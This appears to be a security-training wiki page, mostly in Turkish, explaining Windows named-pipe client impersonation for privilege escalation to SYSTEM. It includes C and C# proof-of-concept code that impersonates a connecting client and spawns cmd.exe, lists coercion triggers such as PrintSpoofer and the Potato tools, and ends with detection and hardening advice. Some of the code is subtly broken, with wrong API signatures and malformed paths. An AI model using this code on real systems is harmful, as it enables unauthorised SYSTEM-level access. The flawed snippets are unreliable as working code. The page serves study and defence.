# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation, bir named-pipe server thread'in ona bağlanan bir client'ın security context'ini benimsemesine izin veren bir local privilege escalation primitive'idir. Pratikte, SeImpersonatePrivilege ile kod çalıştırabilen bir saldırgan, ayrıcalıklı bir client'ı (ör. bir SYSTEM servisi) saldırgan-kontrollü bir pipe'a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient çağırabilir, ortaya çıkan token'ı primary token'a duplicate edebilir ve client olarak (çoğunlukla NT AUTHORITY\SYSTEM) bir process spawn edebilir.

Bu sayfa temel tekniğe odaklanır. SYSTEM'i sizin pipe'ınıza zorlayan uçtan uca exploit zincirleri için aşağıda referans verilen Potato family sayfalarına bakın.

## TL;DR
- Create a named pipe: \\.\pipe\<random> ve bağlantı bekleyin.
- Bir ayrıcalıklı bileşeni buna bağlayın (spooler/DCOM/EFSRPC/etc.).
- Pipe'dan en az bir mesaj okuyun, sonra ImpersonateNamedPipeClient çağırın.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary) ve CreateProcessWithTokenW/CreateProcessAsUser ile bir SYSTEM process elde edin.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
- SeImpersonatePrivilege, bağlanan bir client'ı başarılı şekilde impersonate etmek ve CreateProcessWithTokenW kullanmak için.
- Alternatif olarak, SYSTEM'i impersonate ettikten sonra CreateProcessAsUser kullanabilirsiniz; bu, SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerektirebilir (bunlar SYSTEM'i impersonate ederken karşılanır).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation'dan önce en az bir mesaj okunmalıdır)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation level: yerelde faydalı işlemler yapabilmek için client, SecurityImpersonation'a izin vermelidir (birçok local RPC/named-pipe client için varsayılan). Client'lar pipe'ı açarken SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bunu düşürebilir.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notlar:
- Eğer ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) döndürürse, önce pipe'tan okuduğunuzdan ve istemcinin impersonation'ı Identification seviyesine kısıtlamadığından emin olun.
- Process oluşturmak için uygun bir primary token oluşturmak amacıyla DuplicateTokenEx'i SecurityImpersonation ve TokenPrimary ile tercih edin.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Bu teknikler ayrıcalıklı servisleri sizin named pipe'ınıza bağlanmaya zorlayarak onları taklit etmenizi sağlar:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Troubleshooting and gotchas
- ImpersonateNamedPipeClient çağırmadan önce pipe'dan en az bir mesaj okumalısınız; aksi takdirde ERROR_CANNOT_IMPERSONATE (1368) alırsınız.
- Eğer istemci SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bağlanırsa, sunucu tam olarak taklit edemez; token’ın impersonation level’ını GetTokenInformation(TokenImpersonationLevel) ile kontrol edin.
- CreateProcessWithTokenW çağıranın SeImpersonatePrivilege sahibi olmasını gerektirir. Eğer bu ERROR_PRIVILEGE_NOT_HELD (1314) ile başarısız olursa, önce SYSTEM'i taklit ettikten sonra CreateProcessAsUser kullanın.
- Pipe’inizin security descriptor'ünün, sertleştirirseniz hedef servisin bağlanmasına izin verdiğinden emin olun; varsayılan olarak, \\.\pipe altındaki pipe'lar server’ın DACL'ine göre erişilebilirdir.

## Detection and hardening
- Named pipe oluşturulmasını ve bağlantılarını izleyin. Sysmon Event IDs 17 (Pipe Created) ve 18 (Pipe Connected), meşru pipe isimlerini temel alıp token-manipulation olaylarından önce gelen alışılmadık, rastgele görünen pipe'ları yakalamak için faydalıdır.
- Aşağıdaki sıra dizilerini arayın: bir süreç bir pipe oluşturur, bir SYSTEM servisi bağlanır, ardından oluşturan süreç SYSTEM olarak bir çocuk başlatır.
- Gereksiz servis hesaplarından SeImpersonatePrivilege'i kaldırarak ve yüksek ayrıcalıklı gereksiz servis logonlarından kaçınarak maruziyeti azaltın.
- Defansif geliştirme: güvensiz named pipe'lara bağlanırken, gerektiği durumlar dışında sunucuların istemciyi tam olarak taklit etmesini engellemek için SECURITY_SQOS_PRESENT ile SECURITY_IDENTIFICATION belirtin.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
